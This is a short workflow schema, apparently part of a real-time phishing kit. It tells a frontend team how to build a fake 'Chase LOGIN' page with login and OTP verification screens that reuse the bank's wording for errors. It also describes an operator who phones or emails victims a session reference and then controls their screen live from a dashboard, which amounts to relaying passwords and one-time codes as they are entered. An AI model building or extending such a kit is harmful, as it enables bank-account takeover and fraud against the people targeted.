_readme: Control Room Workflow Schema — Send this file to your vendor's frontend team.
_error_handling: Each state may have predefined_errors. Your UI should listen for 'operator_error' events and display the message. The operator can also send custom error strings not in this list.
name: Chase LOGIN

components_to_build.label: Login
predefined_errors: The User ID or Password you entered is incorrect.
This account has been temporarily locked.
Your session has expired. Please sign on again.

components_to_build.label: OTP Verification
predefined_errors: The verification code is incorrect. Please try again.
Your code has expired. Please request a new one.
Too many attempts. Please wait and try again.

sdk_integration.setup:
1. Drop the provided `vendor-sdk.ts` file into your frontend repository's lib or utils folder.
2. Install required dependencies: npm install @supabase/ssr @supabase/supabase-js
flow: 1. Operator creates a session in the Control Room dashboard → gets reference e.g. 'CR-250515-AB3F'
2. Operator gives reference to the end-user (phone call, email, etc.)
3. User enters reference on your website → your app calls session.connect(ref)
4. Operator controls the flow from dashboard → user's screen updates in real-time
